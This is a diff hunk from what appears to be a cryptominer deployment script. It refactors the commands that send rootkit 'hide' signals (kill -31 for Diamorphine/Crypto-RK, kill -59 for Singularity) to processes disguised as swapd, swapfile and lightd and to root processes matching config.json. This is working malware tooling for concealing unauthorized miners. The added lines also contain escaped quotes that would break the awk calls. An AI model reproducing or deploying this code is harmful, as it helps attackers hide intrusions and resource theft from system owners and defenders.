@@ -2180,17 +2180,17 @@ sleep 3  # Give processes time to be fully up before hiding
 # ---- kill -31: Diamorphine + Crypto-RK hide signal ----
 echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
 pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -31 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -31 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "lightd" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -31 2>/dev/null || true
 echo "[✓] kill -31 sent"
 
 # ---- kill -59: Singularity toggle hide signal ----
 echo "[*] Sending kill -59 (Singularity toggle hide)..."
 pgrep -f -u root config.json | xargs -r kill -59 2>/dev/null || true
-kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
-kill -59 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -59 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -59 2>/dev/null || true
+/bin/ps ax -fu "$USER" | grep "lightd" | grep -v "grep" | awk \'{print $2}\' | xargs -r kill -59 2>/dev/null || true
 echo "[✓] kill -59 sent"
 
 echo '========================================================================'
